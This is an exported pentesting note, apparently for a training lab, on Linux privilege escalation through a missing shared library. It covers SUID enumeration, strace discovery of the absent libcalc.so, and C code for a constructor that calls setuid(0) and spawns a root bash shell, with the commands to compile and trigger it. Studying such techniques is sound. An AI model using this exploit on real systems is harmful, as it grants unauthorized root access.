<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shared Object Injection (missing library)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Shared Object Injection (missing library)</h1><br/><br /><strong><h3>Missing Shared Object loaded by an executable</h3></strong><br />• When a program is executed, it will try to load the shared objects it requires.<br />• By using a program called <strong>strace</strong>, we can track these system calls and determine whether any shared objects were not found.<br />   ◇ If we can write to the location the program tries to open:<br />      1- we can create a shared object<br />      2- then spawn a root shell when the shared object is loaded<br /><br /> 0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;./lse.sh&nbsp;-i&nbsp;|&nbsp;more</div></div><br />    <a href=""><img src="images/1307-1.png" alt="images/1307-1.png" /></a><br />1. manually locate files with the SUID or SGID bits set:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;find&nbsp;/&nbsp;-type&nbsp;f&nbsp;-a&nbsp;\(&nbsp;-perm&nbsp;-u+s&nbsp;-o&nbsp;-perm&nbsp;-g+s&nbsp;\)&nbsp;-exec&nbsp;ls&nbsp;-l&nbsp;{}&nbsp;\;&nbsp;2&gt;&nbsp;/dev/null</div></div><br />    <a href=""><img src="images/1307-2.png" alt="images/1307-2.png" /></a><br />    <a href=""><img src="images/1307-3.png" alt="images/1307-3.png" /></a><br />    We can see that <strong>suid-so</strong> file should execute with SUID permissions<br /><br />2. Run strace on the SUID file<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;strace&nbsp;&nbsp;/usr/local/bin/suid-so&nbsp;2&gt;&amp;1&nbsp;|&nbsp;grep&nbsp;-iE&nbsp;&quot;open|access|no&nbsp;such&nbsp;file&quot;</div></div><br />    <a href=""><img src="images/1307-4.png" alt="images/1307-4.png" /></a><br />    The libcalc.so shared object could not be found, and the program is looking in our user’s home directory, which we can write to.<br /><br />3. Create the /home/user/.config directory. If it not exist already:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;mkdir&nbsp;/home/user/.config</div></div><br />4. Create the file libcalc.c with the following contents:<br />    <div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;stdlib.h&gt;<br />static&nbsp;void&nbsp;inject()&nbsp;__attribute__((constructor));<br />&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;inject()&nbsp;<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;setuid(0);<br />&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;/bin/bash&nbsp;-p&quot;);<br /><span style="color:#000000;font-weight:400">}</span></div></div><br />5. Compile libcalc.c into /home/user/.config/libcalc.so:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;gcc&nbsp;-shared&nbsp;-fPIC&nbsp;-o&nbsp;/home/user/.config/libcalc.so&nbsp;libcalc.c</div></div><br />6. Run the SUID executable to get a root shell:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;/usr/local/bin/suid-so</div></div><br />    <a href=""><img src="images/1307-5.png" alt="images/1307-5.png" /></a></div>
</body>
</html>
